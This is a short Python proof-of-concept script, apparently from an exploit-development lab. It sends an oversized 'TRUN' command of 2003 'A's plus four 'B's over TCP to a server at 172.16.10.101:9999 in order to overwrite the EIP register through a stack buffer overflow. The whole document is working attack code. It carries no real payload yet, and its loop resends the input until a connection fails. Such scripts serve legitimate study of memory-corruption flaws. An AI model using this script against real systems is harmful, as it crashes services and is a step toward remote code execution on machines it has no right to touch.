#!/usr/bin/python3

# Overwriting the EIP

import sys, socket

host = '172.16.10.101'
port = 9999
shellcode = 'A' * 2003 + 'B' * 4

def inject_shellcode(host, port, shellcode):

	while True:
		try:
			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))

			# Sending shellcode to know if EIP is overwritten.
			s.send(('TRUN /.:/' + shellcode).encode('ascii'))
			s.close()
	
		except:
			print("Error connecting to the server..")
			sys.exit()


if __name__ == '__main__':
	inject_shellcode(host, port, shellcode)
